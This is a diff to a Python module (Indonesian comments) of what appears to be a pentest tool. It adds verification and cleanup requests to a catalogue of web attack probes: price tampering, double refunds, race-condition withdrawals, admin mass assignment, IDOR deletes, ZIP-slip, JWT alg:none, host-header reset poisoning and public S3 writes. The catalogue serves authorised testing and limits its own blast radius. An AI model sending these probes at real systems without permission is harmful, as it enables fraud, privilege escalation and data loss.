@@ -31,7 +31,7 @@ berlaku), dan `wth_ai/skills/autowrite.py` mencatat yang terbukti.
 from __future__ import annotations
 
 from dataclasses import dataclass, field
-from typing import Any, Iterable, Sequence
+from typing import Any, Iterable, Mapping, Sequence
 
 #: Urutan tingkat dampak. Dipakai untuk menyaring "seberapa jauh boleh".
 BLAST_ORDER = {"self": 0, "single-object": 1, "mass": 2}
@@ -56,10 +56,23 @@ class Payload:
     notes: str = ""
     bounded_alternative: str = ""
     references: tuple[str, ...] = ()
+    #: Reference READ-ONLY yang menyebut objek yang disentuh, diambil SEBELUM
+    #: operasi. Bentuk argumen `http_probe` dengan placeholder yang sama
+    #: (`{base}`, `{own_id}`, …) — boleh memakai placeholder berbeda dari probe
+    #: (mis. `{target_id}`) bila operasi menyentuh objek lain.
+    verify_probe: dict[str, Any] = field(default_factory=dict)
+    #: Nama field yang WAJIB ada di keadaan jangkar (mis. `qty`). Bila hilang
+    #: setelah operasi, objeknya berubah/hilang.
+    verify_fields: tuple[str, ...] = ()
+    #: Request pemulihan (DELETE/PATCH) yang dikirim autopilot SETELAH operasi
+    #: destruktif berhasil diverifikasi. Kosong = cleanup manual (tidak pernah
+    #: diklaim otomatis berhasil).
+    cleanup_probe: dict[str, Any] = field(default_factory=dict)
 
     def to_dict(self) -> dict[str, Any]:
         data = dict(self.__dict__)
         data["references"] = list(self.references)
+        data["verify_fields"] = list(self.verify_fields)
         return data
 
 
@@ -78,40 +91,57 @@ PAYLOADS: tuple[Payload, ...] = (
        blast_radius="single-object", reversible=True,
        cleanup="Hapus baris keranjang yang tercipta (DELETE {base}/api/cart/{own_id}) atau kosongkan keranjang uji",
        requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/cart", "params": {"item_id": "{own_id}"}},
+       verify_fields=("qty",),
+       cleanup_probe={"method": "DELETE", "url": "{base}/api/cart/{own_id}"},
        notes="Gunakan akun uji milik sendiri; jangan selesaikan checkout."),
     _p(id="BL-002", vuln_class="business_logic", title="Jumlah nol/pecahan pada endpoint stok",
        proves="Kuantitas tidak diinteger-kan: nilai 0.0001 atau 0 bisa dipakai membeli tanpa membayar penuh",
        probe={"method": "POST", "url": "{base}/api/cart", "body": '{"item_id":"{own_id}","qty":0.0001}'},
        blast_radius="single-object", reversible=True, cleanup="Hapus baris keranjang uji",
-       requires_destructive=True, severity_hint="medium"),
+       requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/cart", "params": {"item_id": "{own_id}"}},
+       verify_fields=("qty",),
+       cleanup_probe={"method": "DELETE", "url": "{base}/api/cart/{own_id}"}),
     _p(id="BL-003", vuln_class="business_logic", title="Integer overflow pada kuantitas",
        proves="Kuantitas besar menyebabkan overflow di total/harga (perkalian tak terlindungi)",
        probe={"method": "POST", "url": "{base}/api/cart", "body": '{"item_id":"{own_id}","qty":2147483648}'},
        blast_radius="single-object", reversible=True, cleanup="Hapus baris keranjang uji",
        requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/cart", "params": {"item_id": "{own_id}"}},
+       verify_fields=("qty",),
+       cleanup_probe={"method": "DELETE", "url": "{base}/api/cart/{own_id}"},
        notes="Kirim satu kali; jangan loop nilai."),
     _p(id="BL-004", vuln_class="business_logic", title="Manipulasi harga di body checkout",
        proves="Harga/amount dari klien dipercaya server (price tampering)",
        probe={"method": "POST", "url": "{base}/api/checkout", "body": '{"item_id":"{own_id}","price":1,"qty":1}'},
        blast_radius="single-object", reversible=True,
        cleanup="Batalkan order uji, jangan selesaikan pembayaran",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/orders", "params": {"limit": "1"}},
+       verify_fields=("status",),),
     _p(id="BL-005", vuln_class="business_logic", title="Beda mata uang (IDR vs USD) pada transaksi",
        proves="Mata uang tidak dipatok server: nilai nominal ditafsirkan sebagai mata uang lain",
        probe={"method": "POST", "url": "{base}/api/checkout", "body": '{"item_id":"{own_id}","currency":"IDR","amount":1}'},
        blast_radius="single-object", reversible=True, cleanup="Batalkan order uji",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/orders", "params": {"limit": "1"}},
+       verify_fields=("status",),),
     _p(id="BL-006", vuln_class="business_logic", title="Pembulatan desimal berulang",
        proves="Pembulatan menguntungkan klien bila dilakukan berkali-kali (rounding exploit)",
        probe={"method": "POST", "url": "{base}/api/exchange", "body": '{"from":"A","to":"B","amount":0.005}'},
        blast_radius="single-object", reversible=True, cleanup="Kembalikan saldo uji bila ada; catat nilai sebelum/sesudah",
        requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("balance",),
        notes="Jalankan <=3 kali dan catat saldo; pengulangan besar = mass."),
     _p(id="BL-007", vuln_class="business_logic", title="Satuan berbeda pada field yang sama",
        proves="Server tidak memvalidasi satuan (gram vs kg) sehingga jumlah fisik menyimpang",
        probe={"method": "POST", "url": "{base}/api/order", "body": '{"sku":"{own_id}","qty":1,"unit":"kg"}'},
        blast_radius="single-object", reversible=True, cleanup="Batalkan order uji",
-       requires_destructive=True, severity_hint="medium"),
+       requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/orders", "params": {"limit": "1"}},
+       verify_fields=("status",),),
 
     # ── 2. transisi state ──────────────────────────────────────────────────
     _p(id="ST-001", vuln_class="state_machine", title="Batalkan setelah dikirim (cancel-after-ship)",
@@ -119,24 +149,33 @@ PAYLOADS: tuple[Payload, ...] = (
        probe={"method": "POST", "url": "{base}/api/orders/{own_id}/cancel"},
        blast_radius="single-object", reversible=True,
        cleanup="Buat ulang order uji bila perlu; catat status awal/akhir",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/orders/{own_id}"},
+       verify_fields=("status",),),
     _p(id="ST-002", vuln_class="state_machine", title="Refund ganda",
        proves="Refund dapat dipanggil berkali-kali untuk order yang sama",
        probe={"method": "POST", "url": "{base}/api/orders/{own_id}/refund"},
        blast_radius="single-object", reversible=False,
        cleanup="Tidak dapat dibalik sendiri — laporkan ke pengelola target, jangan ulangi",
        requires_destructive=True, severity_hint="critical",
+       verify_probe={"method": "GET", "url": "{base}/api/orders/{own_id}"},
+       verify_fields=("status",),
        notes="Hanya pada akun uji berizin; satu percobaan, lalu stop."),
     _p(id="ST-003", vuln_class="state_machine", title="Buka kembali tiket yang sudah ditutup",
        proves="Status terminal dapat dibalik klien (reopen closed ticket)",
        probe={"method": "PATCH", "url": "{base}/api/tickets/{own_id}", "body": '{"status":"open"}'},
        blast_radius="single-object", reversible=True, cleanup="Set status kembali ke closed",
-       requires_destructive=True, severity_hint="low"),
+       requires_destructive=True, severity_hint="low",
+       verify_probe={"method": "GET", "url": "{base}/api/tickets/{own_id}"},
+       verify_fields=("status",),
+       cleanup_probe={"method": "PATCH", "url": "{base}/api/tickets/{own_id}", "body": '{"status":"closed"}'}),
     _p(id="ST-004", vuln_class="state_machine", title="Turunkan paket tanpa pembayaran",
        proves="Perubahan paket langganan tidak terikat pembayaran (downgrade/upgrade liar)",
        probe={"method": "POST", "url": "{base}/api/subscription", "body": '{"plan":"pro","paid":false}'},
        blast_radius="single-object", reversible=True, cleanup="Kembalikan ke paket semula",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("plan",),),
     _p(id="ST-005", vuln_class="state_machine", title="Transisi state massal (dokumentasi saja)",
        proves="Semua order dapat dipindahkan statusnya sekaligus bila endpoint batch tidak diautorisasi",
        probe={"method": "POST", "url": "{base}/api/orders/bulk-status", "body": '{"ids":["*"],"status":"cancelled"}'},
@@ -151,47 +190,64 @@ PAYLOADS: tuple[Payload, ...] = (
        probe={"method": "POST", "url": "{base}/api/redeem", "body": '{"code":"{own_id}"}', "parallel": 20},
        blast_radius="single-object", reversible=True,
        cleanup="Catat kode kupon uji; laporkan pemakaian ganda sebelum menutup engagement",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/coupons/{own_id}"},
+       verify_fields=("redeemed",),),
     _p(id="RC-002", vuln_class="race", title="Penarikan saldo paralel",
        proves="Saldo dapat ditarik melebihi saldo karena saldo dibaca sebelum dikurangi",
        probe={"method": "POST", "url": "{base}/api/withdraw", "body": '{"amount":1}', "parallel": 20},
        blast_radius="single-object", reversible=True,
        cleanup="Setor kembali kelebihan pada akun uji; catat saldo sebelum/sesudah",
        requires_destructive=True, severity_hint="critical",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("balance",),
        notes="Hanya akun uji berizin. Jumlahkan selisihnya sebagai bukti, lalu kembalikan."),
     _p(id="RC-003", vuln_class="race", title="TOCTOU stok terakhir",
        proves="Dua pembelian lolos saat stok 1 (inventory oversell)",
        probe={"method": "POST", "url": "{base}/api/cart/checkout", "body": '{"item_id":"{own_id}","qty":1}', "parallel": 10},
        blast_radius="single-object", reversible=True, cleanup="Batalkan order uji yang berlebih",
-       requires_destructive=True, severity_hint="medium"),
+       requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/cart", "params": {"item_id": "{own_id}"}},
+       verify_fields=("qty",),),
     _p(id="RC-004", vuln_class="race", title="Reset token dipakai dua kali secara paralel",
        proves="Token sekali-pakai tidak atomik: dua permintaan paralel sama-sama diterima",
        probe={"method": "POST", "url": "{base}/api/reset/confirm", "body": '{"token":"{own_id}","password":"Wth-Test-9z8y7!"}', "parallel": 5},
        blast_radius="single-object", reversible=True,
        cleanup="Setel ulang kata sandi akun uji ke nilai semula",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "POST", "url": "{base}/api/reset/validate", "body": '{"token":"{own_id}"}'},
+       verify_fields=("used",),),
 
     # ── 4. mass assignment / eskalasi atribut ─────────────────────────────
     _p(id="MA-001", vuln_class="mass_assignment", title="Tambah atribut is_admin/role di body update profil",
        proves="Serializer menerima atribut yang tidak seharusnya dapat diubah klien",
        probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"name":"{marker}","is_admin":true,"role":"admin"}'},
        blast_radius="self", reversible=True, cleanup="Kembalikan nama/atribut profil uji ke semula",
-       requires_destructive=True, severity_hint="critical"),
+       requires_destructive=True, severity_hint="critical",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("name",),
+       cleanup_probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"name":"wth-restored"}'}),
     _p(id="MA-002", vuln_class="mass_assignment", title="Ubah balance/credit lewat body",
        proves="Saldo dapat ditulis dari klien",
        probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"balance":1000}'},
        blast_radius="self", reversible=True, cleanup="Setel saldo kembali seperti semula",
-       requires_destructive=True, severity_hint="critical"),
+       requires_destructive=True, severity_hint="critical",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("balance",),),
     _p(id="MA-003", vuln_class="mass_assignment", title="Pindahkan kepemilikan objek (owner_id)",
        proves="Kepemilikan objek dapat diubah klien (owner_id/tenant_id mass assignment)",
        probe={"method": "PATCH", "url": "{base}/api/items/{own_id}", "body": '{"owner_id":"{other_id}"}'},
        blast_radius="single-object", reversible=True, cleanup="Setel owner_id kembali ke pemilik awal",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/items/{own_id}"},
+       verify_fields=("owner_id",),),
     _p(id="MA-004", vuln_class="mass_assignment", title="Lewati verifikasi email/telepon",
        proves="Flag verified dapat diaktifkan klien tanpa verifikasi",
        probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"email_verified":true,"verified":true}'},
        blast_radius="self", reversible=True, cleanup="Kembalikan flag verifikasi akun uji",
-       requires_destructive=True, severity_hint="medium"),
+       requires_destructive=True, severity_hint="medium",
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("email_verified",),),
     _p(id="MA-005", vuln_class="mass_assignment", title="Mass assignment pada SEMUA user (dokumentasi saja)",
        proves="Batch update dapat mengubah atribut seluruh pengguna",
        probe={"method": "PATCH", "url": "{base}/api/users/bulk", "body": '{"role":"admin","all":true}'},
@@ -207,16 +263,24 @@ PAYLOADS: tuple[Payload, ...] = (
        blast_radius="single-object", reversible=True,
        cleanup="Kembalikan nama objek ke nilai semula (catat nama SEBELUM mengubah)",
        requires_destructive=True, severity_hint="high",
+       # Anchor objek yang disentuh operasi; `expected` = field yang wajib ada
+       # agar keadaannya bisa dibandingkan sebelum vs sesudah.
+       verify_probe={"method": "GET", "url": "{base}/api/items/{other_id}"},
+       verify_fields=("name",),
        notes="Catat nilai lama dulu; tanpa itu tidak ada pemulihan."),
     _p(id="IW-002", vuln_class="idor_write", title="Hapus objek buatan sendiri lewat akun lain",
        proves="Penghapusan hanya memeriksa autentikasi, bukan kepemilikan (bounded: objek milik kita)",
        probe={"method": "DELETE", "url": "{base}/api/items/{own_other_id}"},
        blast_radius="self", reversible=True, cleanup="Buat ulang objek uji setelah dibuktikan",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/items/{own_other_id}"},
+       verify_fields=("id",),),
     _p(id="IW-003", vuln_class="idor_write", title="Hapus objek user lain (kontrol)",
        proves="Sama seperti IW-002 tetapi pada objek korban — HANYA bila target menyediakan akun uji kedua",
        probe={"method": "DELETE", "url": "{base}/api/items/{other_id}"},
        blast_radius="single-object", reversible=False,
+       verify_probe={"method": "GET", "url": "{base}/api/items/{other_id}"},
+       verify_fields=("name",),
        cleanup="Tidak dapat dipulihkan sendiri — butuh izin eksplisit pemilik data",
        requires_destructive=True, severity_hint="critical",
        notes="Pakai IW-002 dulu; IW-003 hanya bila engagement punya akun uji kedua dan pemulihannya disetujui."),
@@ -292,17 +356,23 @@ PAYLOADS: tuple[Payload, ...] = (
        probe={"method": "POST", "url": "{base}/api/upload", "body": "{marker}.php berisi teks biasa", "content_type": "multipart/form-data"},
        blast_radius="self", reversible=True, cleanup="Hapus berkas unggahan uji",
        requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/uploads"},
+       verify_fields=("files",),
        notes="Isi berkas hanya teks penanda; tidak ada kode yang dieksekusi."),
     _p(id="FP-003", vuln_class="file_path", title="ZIP-slip dengan path jinak",
        proves="Arsip diekstrak tanpa normalisasi path (entri keluar direktori)",
        probe={"method": "POST", "url": "{base}/api/import", "body": "zip berisi entri ../../{marker}.txt", "content_type": "multipart/form-data"},
        blast_radius="single-object", reversible=True, cleanup="Hapus berkas {marker}.txt di lokasi yang tertulis di respons",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/imports"},
+       verify_fields=("entries",),),
     _p(id="FP-004", vuln_class="file_path", title="Tukar symlink pada berkas sementara",
        proves="Aplikasi mengikuti symlink saat membaca/menulis berkas sementara",
        probe={"method": "POST", "url": "{base}/api/export", "body": '{"target":"{marker}"}'},
        blast_radius="single-object", reversible=True, cleanup="Hapus symlink uji",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/exports"},
+       verify_fields=("items",),),
 
     # ── 8. cache & desync ─────────────────────────────────────────────────
     _p(id="CD-001", vuln_class="cache_desync", title="Cache poisoning lewat header penanda",
@@ -345,7 +415,10 @@ PAYLOADS: tuple[Payload, ...] = (
        probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"mutation{update(id:\\"{other_id}\\",note:\\"{marker}\\"){id}}"}',
               },
        blast_radius="single-object", reversible=True, cleanup="Kembalikan catatan objek ke nilai semula",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"{item(id:\"{other_id}\"){id note}}"}',
+                     "mutating": False},
+       verify_fields=("note",),),
     _p(id="API-005", vuln_class="api_graphql", title="Kedalaman query berlebih (bounded)",
        proves="Query bersarang dalam tidak dibatasi (amplifikasi)",
        probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"{a{id friends{id friends{id}}}}"}', "max_depth": 6},
@@ -357,12 +430,17 @@ PAYLOADS: tuple[Payload, ...] = (
        proves="Token sekali-pakai masih berlaku setelah dipakai",
        probe={"method": "POST", "url": "{base}/api/reset/confirm", "body": '{"token":"{own_id}","password":"Wth-Test-9z8y7!"}'},
        blast_radius="self", reversible=True, cleanup="Setel ulang kata sandi akun uji ke semula",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "POST", "url": "{base}/api/reset/validate", "body": '{"token":"{own_id}"}'},
+       verify_fields=("used",),),
     _p(id="AU-002", vuln_class="auth_session", title="Session fixation pada login",
        proves="ID sesi tidak dirotasi setelah autentikasi",
        probe={"method": "POST", "url": "{base}/login", "body": "user={own_id}&pass={marker}", "headers": {"Cookie": "sid={marker}"}},
        blast_radius="self", reversible=True, cleanup="Hapus cookie/sesi uji",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "GET", "url": "{base}/api/sessions/current",
+                     "headers": {"Cookie": "sid={marker}"}},
+       verify_fields=("rotated",),),
     _p(id="AU-003", vuln_class="auth_session", title="JWT alg:none diterima",
        proves="Verifikasi tanda tangan dapat dilewati dengan alg none",
        probe={"method": "GET", "url": "{base}/api/me", "headers": {"Authorization": "Bearer {none_jwt}"}},
@@ -379,14 +457,19 @@ PAYLOADS: tuple[Payload, ...] = (
        proves="Perubahan kata sandi tidak meminta kredensial saat ini",
        probe={"method": "POST", "url": "{base}/api/password", "body": '{"new":"Wth-Test-9z8y7!"}'},
        blast_radius="self", reversible=True, cleanup="Setel ulang kata sandi akun uji ke semula",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       verify_probe={"method": "POST", "url": "{base}/api/login", "body": '{"user":"{own_id}","pass":"Wth-Test-9z8y7!"}'},
+       verify_fields=("ok",),),
 
     # ── 11. cloud / storage ───────────────────────────────────────────────
     _p(id="CL-001", vuln_class="cloud_storage", title="Bucket dapat ditulis (objek penanda)",
        proves="Izin tulis publik pada bucket (unauthenticated PUT)",
        probe={"method": "PUT", "url": "https://{bucket}.s3.amazonaws.com/{marker}.txt", "body": "{marker}"},
        blast_radius="self", reversible=True, cleanup="Hapus objek {marker}.txt setelah dibuktikan",
-       requires_destructive=True, severity_hint="critical"),
+       requires_destructive=True, severity_hint="critical",
+       verify_probe={"method": "GET", "url": "https://{bucket}.s3.amazonaws.com/{marker}.txt"},
+       verify_fields=("marker",),
+       cleanup_probe={"method": "DELETE", "url": "https://{bucket}.s3.amazonaws.com/{marker}.txt"}),
     _p(id="CL-002", vuln_class="cloud_storage", title="Pre-signed URL dipakai ulang setelah kedaluwarsa",
        proves="Kedaluwarsa tanda tangan tidak ditegakkan",
        probe={"method": "GET", "url": "{base}/signed?token={own_id}"},
@@ -411,7 +494,12 @@ PAYLOADS: tuple[Payload, ...] = (
        probe={"method": "POST", "url": "{base}/api/password/forgot", "body": '{"email":"{own_email}"}',
               "headers": {"Host": "{marker}.example"}},
        blast_radius="self", reversible=True, cleanup="Abaikan tautan yang terkirim; catat isinya sebagai bukti",
-       requires_destructive=True, severity_hint="high"),
+       requires_destructive=True, severity_hint="high",
+       # Tidak ada state yang dibaca ulang: efeknya adalah email yang terkirim.
+       # Anchor tetap ada supaya verifier menolak dengan alasan eksplisit,
+       # bukan mengklaim sukses.
+       verify_probe={"method": "GET", "url": "{base}/api/me"},
+       verify_fields=("id",),),
     _p(id="HH-002", vuln_class="host_header", title="CRLF pada header/parameter",
        proves="Input masuk ke header respons tanpa penyaringan (injeksi header)",
        probe={"method": "GET", "url": "{base}/?q={marker}%0d%0aX-Wth-Injected:%20{marker}"},
@@ -491,6 +579,33 @@ def render_probe(payload: Payload, **values: Any) -> dict[str, Any]:
             for name, replacement in values.items():
                 text = text.replace("{" + name + "}", str(replacement))
             filled[key] = text
+        else:
+            filled[key] = value
+    return filled
+
+
+def render_probe_dict(probe: Mapping[str, Any], values: Mapping[str, Any]) -> dict[str, Any]:
+    """Isi placeholder pada dict probe SEBARANG (anchor/cleanup), rekursif dangkal.
+
+    Nilai yang bukan string tetap dipakai apa adanya; dict bersarang (mis.
+    `params`) dirender per nilai supaya anchor tidak menyimpan placeholder
+    mentah yang akan salah dibaca sebagai URL.
+    """
+    filled: dict[str, Any] = {}
+    for key, value in probe.items():
+        if isinstance(value, str):
+            text = value
+            for name, replacement in values.items():
+                text = text.replace("{" + name + "}", str(replacement))
+            filled[key] = text
+        elif isinstance(value, dict):
+            nested: dict[str, Any] = {}
+            for inner_key, inner_value in value.items():
+                if isinstance(inner_value, str):
+                    for name, replacement in values.items():
+                        inner_value = inner_value.replace("{" + name + "}", str(replacement))
+                nested[str(inner_key)] = inner_value
+            filled[key] = nested
         else:
             filled[key] = value
     return filled
